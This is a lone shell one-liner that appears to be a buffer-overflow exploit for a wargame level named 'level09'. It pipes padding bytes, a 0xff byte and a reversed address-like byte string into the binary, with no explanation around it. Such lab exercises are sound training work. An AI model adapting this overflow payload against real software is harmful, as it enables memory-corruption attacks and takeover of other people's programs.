cat <(echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xff") <(python -c 'print "A" * 286 + "\0\x55\x55\x55\x55\x48\x8c"[::-1] ') - | ./level09
